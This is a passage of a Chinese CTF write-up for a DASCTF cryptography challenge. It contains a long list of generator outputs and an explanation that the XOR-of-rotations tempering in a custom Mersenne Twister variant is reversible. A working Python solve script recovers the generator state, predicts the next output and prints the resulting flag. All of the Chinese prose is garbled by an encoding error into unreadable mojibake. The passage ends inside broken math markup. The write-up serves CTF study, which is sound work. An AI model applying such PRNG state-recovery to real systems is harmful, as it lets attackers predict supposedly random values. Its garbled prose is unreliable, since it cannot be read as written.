class="hljs-number">2470333529</span>, <span class="hljs-number">3901870125</span>, <span class="hljs-number">3589884387</span>, <span class="hljs-number">3339475693</span>, <span class="hljs-number">1526947412</span>, <span class="hljs-number">1747516667</span>, <span class="hljs-number">2971536797</span>, <span class="hljs-number">273910310</span>, <span class="hljs-number">2185887289</span>, <span class="hljs-number">2723697010</span>, <span class="hljs-number">1973585459</span>, <span class="hljs-number">1166325256</span>, <span class="hljs-number">1360822059</span>, <span class="hljs-number">416514510</span>, <span class="hljs-number">4038763765</span>, <span class="hljs-number">1816380840</span>, <span class="hljs-number">940152644</span>, <span class="hljs-number">3918708431</span>, <span class="hljs-number">3410593321</span>, <span class="hljs-number">3358844522</span>, <span class="hljs-number">3678637784</span>, <span class="hljs-number">2412834780</span>, <span class="hljs-number">3052967117</span>, <span class="hljs-number">3672611162</span>, <span class="hljs-number">570069042</span>, <span class="hljs-number">95771608</span>, <span class="hljs-number">1210821251</span>, <span class="hljs-number">2163778365</span>, <span class="hljs-number">2739972546</span>, <span class="hljs-number">3094346015</span>, <span class="hljs-number">749719666</span>, <span class="hljs-number">1697477587</span>, <span class="hljs-number">986142486</span>, <span class="hljs-number">2591897292</span>, <span class="hljs-number">1234948693</span>, <span class="hljs-number">3659791160</span>, <span class="hljs-number">3990257960</span>, <span class="hljs-number">501199958</span>, <span class="hljs-number">3029961497</span>, <span class="hljs-number">578415668</span>, <span class="hljs-number">124517322</span>, <span class="hljs-number">1985205894</span>, <span class="hljs-number">3777347400</span>, <span class="hljs-number">1149995545</span>, <span class="hljs-number">290699775</span>, <span class="hljs-number">3399696193</span>, <span class="hljs-number">1062094395</span>, <span class="hljs-number">2896523484</span>, <span class="hljs-number">1562688856</span>, <span class="hljs-number">992098141</span>, <span class="hljs-number">3941170280</span>, <span class="hljs-number">262596967</span>, <span class="hljs-number">2585751001</span>, <span class="hljs-number">3682611205</span>, <span class="hljs-number">530523926</span>, <span class="hljs-number">1202322766</span>, <span class="hljs-number">3777439514</span>, <span class="hljs-number">3051700271</span>, <span class="hljs-number">261632458</span>, <span class="hljs-number">2736123960</span>, <span class="hljs-number">2786338595</span>, <span class="hljs-number">86310784</span>, <span class="hljs-number">2760191516</span>, <span class="hljs-number">1344514731</span>, <span class="hljs-number">350767781</span>, <span class="hljs-number">2858876127</span>, <span class="hljs-number">519088864</span>, <span class="hljs-number">3193340756</span>, <span class="hljs-number">3563489312</span>, <span class="hljs-number">3239917298</span>, <span class="hljs-number">161418824</span>, <span class="hljs-number">470724403</span>, <span class="hljs-number">3310407387</span>, <span class="hljs-number">1743713887</span>, <span class="hljs-number">3064036770</span>, <span class="hljs-number">1175434157</span>, <span class="hljs-number">3029464330</span>, <span class="hljs-number">116086349</span>, <span class="hljs-number">1652489862</span>, <span class="hljs-number">1176236897</span>, <span class="hljs-number">4139800383</span>, <span class="hljs-number">3758499033</span>, <span class="hljs-number">2961626313</span>, <span class="hljs-number">3064683859</span>, <span class="hljs-number">958478146</span>, <span class="hljs-number">596650527</span>, <span class="hljs-number">1000277312</span>, <span class="hljs-number">4102368994</span>, <span class="hljs-number">1480011430</span>, <span class="hljs-number">4001401502</span>, <span class="hljs-number">4004287177</span>, <span class="hljs-number">3202905309</span>, <span class="hljs-number">1754655955</span>, <span class="hljs-number">2064262245</span>, <span class="hljs-number">1840530874</span>, <span class="hljs-number">2284428117</span>, <span class="hljs-number">2281854453</span>, <span class="hljs-number">1023839768</span>, <span class="hljs-number">2166517711</span>, <span class="hljs-number">2709857675</span>, <span class="hljs-number">2005014414</span>, <span class="hljs-number">4161461001</span>, <span class="hljs-number">2932436148</span>, <span class="hljs-number">2411599350</span>, <span class="hljs-number">4267437788</span>, <span class="hljs-number">2132764972</span>, <span class="hljs-number">150665266</span>, <span class="hljs-number">286170947</span>, <span class="hljs-number">2249288787</span>, <span class="hljs-number">3953585886</span>, <span class="hljs-number">1231725143</span>, <span class="hljs-number">2479045931</span>, <span class="hljs-number">2377059462</span>, <span class="hljs-number">281316188</span>, <span class="hljs-number">379113422</span>, <span class="hljs-number">920019004</span>, <span class="hljs-number">163289886</span>, <span class="hljs-number">2210874762</span>, <span class="hljs-number">1578529538</span>, <span class="hljs-number">309521495</span>, <span class="hljs-number">3737017316</span>, <span class="hljs-number">88919917</span>, <span class="hljs-number">559742618</span>, <span class="hljs-number">978230553</span>, <span class="hljs-number">2154491496</span>, <span class="hljs-number">994913727</span>, <span class="hljs-number">498894258</span>, <span class="hljs-number">1355546448</span>, <span class="hljs-number">4023836881</span>, <span class="hljs-number">3014313787</span>, <span class="hljs-number">164044564</span>, <span class="hljs-number">2408825840</span>, <span class="hljs-number">2029992558</span>, <span class="hljs-number">3707778216</span>, <span class="hljs-number">86206872</span>, <span class="hljs-number">3576935874</span>, <span class="hljs-number">185356787</span>, <span class="hljs-number">1774175910</span>, <span class="hljs-number">3145237900</span>, <span class="hljs-number">3497547609</span>, <span class="hljs-number">841914878</span>, <span class="hljs-number">3425254534</span>, <span class="hljs-number">4264030778</span>, <span class="hljs-number">2348022032</span>, <span class="hljs-number">178331591</span>, <span class="hljs-number">943923822</span>, <span class="hljs-number">3384367749</span>, <span class="hljs-number">2806712599</span>, <span class="hljs-number">1178535099</span>, <span class="hljs-number">1251085540</span>, <span class="hljs-number">2410015803</span>, <span class="hljs-number">1480595408</span>, <span class="hljs-number">2732607876</span>, <span class="hljs-number">1579706357</span>, <span class="hljs-number">870791724</span>, <span class="hljs-number">2320512780</span>, <span class="hljs-number">2149666862</span>, <span class="hljs-number">3797999384</span>, <span class="hljs-number">3905363134</span>, <span class="hljs-number">3388169321</span>, <span class="hljs-number">851973359</span>, <span class="hljs-number">1418716205</span>, <span class="hljs-number">207581030</span>, <span class="hljs-number">1740441523</span>, <span class="hljs-number">1173839013</span>, <span class="hljs-number">4280610104</span>, <span class="hljs-number">1769134281</span>, <span class="hljs-number">1758916333</span>, <span class="hljs-number">4061069248</span>, <span class="hljs-number">2147554262</span>, <span class="hljs-number">2749007447</span>, <span class="hljs-number">909878569</span>, <span class="hljs-number">2054562584</span>, <span class="hljs-number">1515003000</span>, <span class="hljs-number">560286390</span>, <span class="hljs-number">2482663802</span>, <span class="hljs-number">2690882951</span>, <span class="hljs-number">3298162668</span>, <span class="hljs-number">2561737261</span>, <span class="hljs-number">167825221</span>, <span class="hljs-number">507375343</span>, <span class="hljs-number">2179952491</span>, <span class="hljs-number">795452860</span>, <span class="hljs-number">2877704207</span>, <span class="hljs-number">3243106071</span>, <span class="hljs-number">1633372043</span>, <span class="hljs-number">2152178033</span>, <span class="hljs-number">2993246714</span>, <span class="hljs-number">4176238981</span>, <span class="hljs-number">3828458887</span>, <span class="hljs-number">695369535</span>, <span class="hljs-number">2514762808</span>, <span class="hljs-number">2251430819</span>, <span class="hljs-number">2743651063</span>, <span class="hljs-number">783239046</span>, <span class="hljs-number">4036497041</span>, <span class="hljs-number">2175424426</span>, <span class="hljs-number">765021321</span>, <span class="hljs-number">897227922</span>, <span class="hljs-number">3192938155</span>, <span class="hljs-number">4173350810</span>, <span class="hljs-number">2290496185</span>, <span class="hljs-number">4215986056</span>, <span class="hljs-number">2448481441</span>, <span class="hljs-number">3114984799</span>, <span class="hljs-number">2920066349</span>, <span class="hljs-number">722868808</span>, <span class="hljs-number">594363801</span>, <span class="hljs-number">4012575088</span>, <span class="hljs-number">454547939</span>, <span class="hljs-number">3331771662</span>, <span class="hljs-number">1267229957</span>, <span class="hljs-number">3170277692</span>, <span class="hljs-number">2446344734</span>, <span class="hljs-number">3730529788</span>, <span class="hljs-number">2621611481</span>, <span class="hljs-number">2972284304</span>, <span class="hljs-number">2580290241</span>, <span class="hljs-number">486727007</span>, <span class="hljs-number">2727955445</span>, <span class="hljs-number">1457071884</span>, <span class="hljs-number">1053028185</span>, <span class="hljs-number">462301682</span>, <span class="hljs-number">3907840756</span>, <span class="hljs-number">1832398102</span>, <span class="hljs-number">3144685297</span>, <span class="hljs-number">3403964915</span>, <span class="hljs-number">4263570498</span>, <span class="hljs-number">792776003</span>, <span class="hljs-number">306771255</span>, <span class="hljs-number">1633688240</span>, <span class="hljs-number">2159479271</span>, <span class="hljs-number">942060576</span>, <span class="hljs-number">1311531808</span>, <span class="hljs-number">3145754189</span>, <span class="hljs-number">4142271069</span>, <span class="hljs-number">2844524541</span>, <span class="hljs-number">4082439147</span>, <span class="hljs-number">2847276716</span>, <span class="hljs-number">1374436698</span>, <span class="hljs-number">2601522390</span>, <span class="hljs-number">529644524</span>, <span class="hljs-number">206090172</span>, <span class="hljs-number">3015114937</span>, <span class="hljs-number">4137169373</span>, <span class="hljs-number">2600331537</span>, <span class="hljs-number">344659140</span>, <span class="hljs-number">155319271</span>, <span class="hljs-number">1724932164</span>, <span class="hljs-number">3187877676</span>, <span class="hljs-number">4020168431</span>, <span class="hljs-number">711431575</span>, <span class="hljs-number">4123955169</span>, <span class="hljs-number">2539963709</span>, <span class="hljs-number">2764832709</span>, <span class="hljs-number">3897838285</span>, <span class="hljs-number">2521203644</span>, <span class="hljs-number">2059212822</span>, <span class="hljs-number">1129046005</span>, <span class="hljs-number">3277260664</span>, <span class="hljs-number">2739869189</span>, <span class="hljs-number">1955591901</span>, <span class="hljs-number">2661672178</span>, <span class="hljs-number">2926355273</span>, <span class="hljs-number">28176978</span>, <span class="hljs-number">706409211</span>, <span class="hljs-number">1432061304</span>, <span class="hljs-number">26517996</span>, <span class="hljs-number">3180196905</span>, <span class="hljs-number">2178525849</span>, <span class="hljs-number">607854674</span>, <span class="hljs-number">3953350517</span>, <span class="hljs-number">3532394548</span>, <span class="hljs-number">4175940932</span>, <span class="hljs-number">626671309</span>, <span class="hljs-number">1273934270</span>, <span class="hljs-number">3481828801</span>, <span class="hljs-number">22643989</span>, <span class="hljs-number">2104739013</span>, <span class="hljs-number">4183577772</span>, <span class="hljs-number">3932721637</span>, <span class="hljs-number">3075788222</span>, <span class="hljs-number">2814353001</span>, <span class="hljs-number">4120869721</span>, <span class="hljs-number">2045506903</span>, <span class="hljs-number">603494333</span>, <span class="hljs-number">335162960</span>, <span class="hljs-number">2069261279</span>, <span class="hljs-number">2278614835</span>, <span class="hljs-number">210140447</span>, <span class="hljs-number">2012566692</span>, <span class="hljs-number">2345710126</span>, <span class="hljs-number">70390387</span>, <span class="hljs-number">457247932</span>, <span class="hljs-number">2764651800</span>, <span class="hljs-number">652766919</span>, <span class="hljs-number">555253440</span>, <span class="hljs-number">864036913</span>, <span class="hljs-number">1720142260</span>, <span class="hljs-number">453262569</span>, <span class="hljs-number">1113437101</span>, <span class="hljs-number">2576419688</span>, <span class="hljs-number">144008475</span>, <span class="hljs-number">1786881829</span>, <span class="hljs-number">2455128823</span>, <span class="hljs-number">2884922345</span>, <span class="hljs-number">4251332234</span>, <span class="hljs-number">58949785</span>, <span class="hljs-number">4206002785</span>, <span class="hljs-number">3374754553</span>, <span class="hljs-number">2976162198</span>, <span class="hljs-number">546450687</span>, <span class="hljs-number">1268444784</span>, <span class="hljs-number">4132330381</span>, <span class="hljs-number">3404894280</span>, <span class="hljs-number">2421962142</span>, <span class="hljs-number">212361299</span>, <span class="hljs-number">2526283704</span>, <span class="hljs-number">1656118437</span>, <span class="hljs-number">1249336298</span>, <span class="hljs-number">305885855</span>, <span class="hljs-number">1090758249</span>, <span class="hljs-number">3752057640</span>, <span class="hljs-number">3508190692</span>, <span class="hljs-number">3637428</span>, <span class="hljs-number">105102422</span>, <span class="hljs-number">2247418237</span>, <span class="hljs-number">1873609555</span>, <span class="hljs-number">1206760240</span>, <span class="hljs-number">3761689119</span>, <span class="hljs-number">3151616638</span>, <span class="hljs-number">1711308858</span>, <span class="hljs-number">1261541178</span>, <span class="hljs-number">1843103377</span>, <span class="hljs-number">3158893523</span>, <span class="hljs-number">1226253110</span>, <span class="hljs-number">3337577909</span>, <span class="hljs-number">126612372</span>, <span class="hljs-number">2239219657</span>, <span class="hljs-number">1415387229</span>, <span class="hljs-number">3657507305</span>, <span class="hljs-number">3330696118</span>, <span class="hljs-number">2304219467</span>, <span class="hljs-number">3782535397</span>, <span class="hljs-number">2523926865</span>, <span class="hljs-number">173770442</span>, <span class="hljs-number">469421316</span>, <span class="hljs-number">4068724979</span>, <span class="hljs-number">567442650</span>, <span class="hljs-number">1996215573</span>, <span class="hljs-number">2071307093</span>, <span class="hljs-number">778899724</span>, <span class="hljs-number">3534102235</span>, <span class="hljs-number">1001138889</span>, <span class="hljs-number">2821812427</span>, <span class="hljs-number">591691317</span>, <span class="hljs-number">1265763678</span>, <span class="hljs-number">2241915660</span>, <span class="hljs-number">3220601768</span>, <span class="hljs-number">653090205</span>, <span class="hljs-number">2367897867</span>, <span class="hljs-number">1393909319</span>, <span class="hljs-number">2691817329</span>, <span class="hljs-number">3098049768</span>, <span class="hljs-number">117121403</span>, <span class="hljs-number">1255294678</span>, <span class="hljs-number">2272844919</span>, <span class="hljs-number">788255921</span>, <span class="hljs-number">2333869622</span>, <span class="hljs-number">4052660679</span>, <span class="hljs-number">2407095869</span>, <span class="hljs-number">2636108242</span>, <span class="hljs-number">2204717619</span>, <span class="hljs-number">1672726444</span>, <span class="hljs-number">2250826426</span>, <span class="hljs-number">258706466</span>, <span class="hljs-number">2295454699</span>, <span class="hljs-number">337308034</span>, <span class="hljs-number">3703973770</span>, <span class="hljs-number">3133498524</span>, <span class="hljs-number">22718827</span>, <span class="hljs-number">3096937679</span>, <span class="hljs-number">2039003308</span>, <span class="hljs-number">1519854757</span>, <span class="hljs-number">568184976</span>, <span class="hljs-number">1986854118</span>, <span class="hljs-number">2888207511</span>, <span class="hljs-number">822307630</span>, <span class="hljs-number">3829301724</span>, <span class="hljs-number">3198527490</span>, <span class="hljs-number">3073739663</span>, <span class="hljs-number">3043580445</span>, <span class="hljs-number">3458239370</span>, <span class="hljs-number">802145890</span>, <span class="hljs-number">376901460</span>, <span class="hljs-number">1251103099</span>, <span class="hljs-number">1143003993</span>, <span class="hljs-number">1280321148</span>, <span class="hljs-number">661386076</span>, <span class="hljs-number">3708710489</span>, <span class="hljs-number">2237151715</span>, <span class="hljs-number">3928104641</span>, <span class="hljs-number">2975550516</span>, <span class="hljs-number">1087492088</span>, <span class="hljs-number">1504028830</span>, <span class="hljs-number">61927086</span>, <span class="hljs-number">3858242888</span>, <span class="hljs-number">1916136658</span>, <span class="hljs-number">2328550074</span>, <span class="hljs-number">3032032377</span>, <span class="hljs-number">2193802260</span>, <span class="hljs-number">3311627503</span>, <span class="hljs-number">3196945045</span>, <span class="hljs-number">3396801792</span>, <span class="hljs-number">806210594</span>, <span class="hljs-number">2449941623</span>, <span class="hljs-number">2514744466</span>, <span class="hljs-number">3922130206</span>, <span class="hljs-number">3245757763</span>, <span class="hljs-number">3128328446</span>, <span class="hljs-number">2335833206</span>, <span class="hljs-number">3205660364</span>, <span class="hljs-number">3527402441</span>, <span class="hljs-number">2174241644</span>, <span class="hljs-number">1262568556</span>, <span class="hljs-number">2360103007</span>, <span class="hljs-number">2490217737</span>, <span class="hljs-number">1485100950</span>, <span class="hljs-number">3407260</span>, <span class="hljs-number">3005226942</span>, <span class="hljs-number">1355314866</span>, <span class="hljs-number">3154763465</span>, <span class="hljs-number">619881867</span>, <span class="hljs-number">2409963438</span>, <span class="hljs-number">2422269402</span>, <span class="hljs-number">205756019</span>, <span class="hljs-number">3300644241</span>, <span class="hljs-number">1157501775</span>, <span class="hljs-number">1229058028</span>, <span class="hljs-number">161050869</span>, <span class="hljs-number">969496287</span>, <span class="hljs-number">3385825249</span>, <span class="hljs-number">2557284067</span>, <span class="hljs-number">4236642714</span>, <span class="hljs-number">169094727</span>, <span class="hljs-number">2698326774</span>, <span class="hljs-number">1863176242</span>, <span class="hljs-number">3532885426</span>, <span class="hljs-number">3046403588</span>, <span class="hljs-number">3869207867</span>, <span class="hljs-number">496104150</span>, <span class="hljs-number">353604631</span>, <span class="hljs-number">1054882225</span>, <span class="hljs-number">152711981</span>, <span class="hljs-number">1362131890</span>, <span class="hljs-number">76912113</span>, <span class="hljs-number">3052177189</span>, <span class="hljs-number">3932252092</span>, <span class="hljs-number">3834713905</span>, <span class="hljs-number">2338378436</span>, <span class="hljs-number">44417325</span>, <span class="hljs-number">117723195</span>, <span class="hljs-number">1089433566</span>, <span class="hljs-number">4166617161</span>, <span class="hljs-number">2848021308</span>, <span class="hljs-number">2229619096</span>, <span class="hljs-number">319957702</span>, <span class="hljs-number">3661655667</span>, <span class="hljs-number">2809620731</span>, <span class="hljs-number">482011930</span>, <span class="hljs-number">3983483016</span>, <span class="hljs-number">82362287</span>, <span class="hljs-number">1518135562</span>, <span class="hljs-number">3490996143</span>, <span class="hljs-number">510129461</span>, <span class="hljs-number">1400609584</span>, <span class="hljs-number">2646113779</span>, <span class="hljs-number">732457215</span>, <span class="hljs-number">3735585198</span>, <span class="hljs-number">3451194227</span>, <span class="hljs-number">959269510</span>, <span class="hljs-number">244188667</span>]<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä¹Ÿç»™å‡ºæ¥å§ï¼Œè¿™æ ·ä½ ä»¬è¦æ˜¯æƒ³åšä¹Ÿèƒ½åšäº†ã€‚</p><p>åˆ†æä¸€ä¸‹æµç¨‹ï¼Œæˆ‘ä»¬æœ€ç»ˆå®è¦å¾—åˆ°è¿™ä¸ª<code>r.rand()</code>çš„å€¼ï¼Œæˆ‘ä»¬æ‰èƒ½å¾—åˆ°flagã€‚é‚£ä¹ˆçœ‹ä¸€çœ‹randæ˜¯æ€ä¹ˆè¿ä½œçš„ã€‚</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“indexä¸º0çš„æ—¶å€™ï¼Œä¼šå°†MTé‡æ–°ç”Ÿæˆã€‚</p><p>äº§ç”Ÿrandçš„æ—¶å€™ï¼Œä½¿ç”¨å½“å‰çš„indexä½œä¸ºç´¢å¼•ï¼Œä½¿ç”¨MT[index]ä¸ºåŸºå€¼è¿›è¡Œå˜æ¢æœ€åå¾—åˆ°æˆ‘ä»¬çš„randï¼ŒåŒæ—¶indexå¢é•¿1ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br></code></pre></td></tr></table></figure><p>åœ¨ä¸»æµç¨‹çš„æ—¶é‡Œé¢ï¼Œè¿™é‡Œæˆ‘ä»¬ç”Ÿæˆäº†624ä¸ªrandã€‚é‚£ä¹ˆæˆ‘ä»¬ç”Ÿæˆflagçš„æ—¶å€™ï¼Œindexçš„å€¼æ˜¯0ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨ç”Ÿæˆflagçš„æ—¶å€™ï¼ŒMTè¡¨ä¼šå…ˆè¿›è¡Œé‡æ–°çš„ç”Ÿæˆã€‚é‚£ä¹ˆæˆ‘ä»¬æƒ³è¦å¾—åˆ°flagå°±å¾—å…ˆå¾—åˆ°å¯¹åº”çš„MTè¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„yæ˜¯ä¸€ç§å¾ªç¯ä½ç§»å¼‚æˆ–çš„ç”Ÿæˆæ–¹å¼ï¼Œè€Œä¸”ä¸€å…±æœ‰3é¡¹ï¼Œæ˜¯å¥‡æ•°é¡¹ã€‚æ‰€ä»¥è¿™ä¸ªè¿‡ç¨‹æ˜¯å¯é€†çš„å¯ä»¥è®¡ç®—çš„ã€‚å…·ä½“çš„ç®—æ³•å¯ä»¥å‚ç…§ä¸€ä¸‹é“¾æ¥:</p><p><a href="https://www.cnblogs.com/Tf1shC4T/p/15927062.html">https://www.cnblogs.com/Tf1shC4T/p/15927062.html</a></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„MTè¡¨ã€‚ç„¶åå¯¹è¿™ä¸ªè¡¨è¿›è¡Œé‡æ–°ç”Ÿæˆï¼Œå–ç¬¬ä¸€ä¸ªæ•°è¿›è¡Œéšæœºæ•°ç”Ÿæˆå³å¯å¾—åˆ°å¯¹åº”çš„flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py </span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;output.txt&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = <span class="hljs-built_in">eval</span>(fp.read())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br>key_right = [<span class="hljs-number">7</span>, <span class="hljs-number">19</span>]<br>key_left = [<span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br><br><br><span class="hljs-comment"># ç ´è§£å³ç§»</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_first</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2r(y, key[<span class="hljs-number">0</span>]) ^ cs2r(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-comment"># ç ´è§£å·¦ç§»</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_second</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2l(y, key[<span class="hljs-number">0</span>]) ^ cs2l(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br>MT = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        y = (MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (MT[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        MT[i] = MT[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>            MT[i] ^= <span class="hljs-number">2567483520</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">index=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> index == <span class="hljs-number">0</span>:<br>        generate()<br>    y = MT[index]<br>    y = y ^ cs2l(y, <span class="hljs-number">11</span>) ^ cs2l(y, <span class="hljs-number">15</span>)<br>    y = y ^ cs2r(y, <span class="hljs-number">7</span>) ^ cs2r(y, <span class="hljs-number">19</span>)<br>    index = (index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    MT = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        MT.append(decrypted_second(decrypted_first(i, key_right), key_left))<br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>    flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹è¿™ä¸ªè§£å¯†å¤šå°†ä¸¤å¥å§ã€‚</p><p>è¿™ä¸ªå…¶å®å¯ä»¥ä½¿ç”¨å·¦ç§»å³ç§»æ··æ‚çš„ï¼Œåªæ˜¯è¿™ä¸€é¢˜ä¸è¡Œã€‚</p><p>è¿™ä¸ªæ–¹æ³•çš„ä½¿ç”¨æ¡ä»¶æ˜¯å³è¾¹å¼‚æˆ–çš„é¡¹æ•°å¿…é¡»æ˜¯å¥‡æ•°ä¸ªï¼Œè€Œä¸”ç¬¬ä¸€é¡¹æ˜¯æ²¡æœ‰ä½ç§»çš„ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mo>âŠ•</mo><mo stretchy="false">(</mo><mi>x</mi><mo>â‹™</mo><mi>p</mi><mo stretchy="false">)</mo><mo>âŠ•</mo><mo stretchy="false">(</mo><mi>x</mi><mo>â‹˜</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y = x \oplus (x \ggg p) \oplus (x \lll q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span 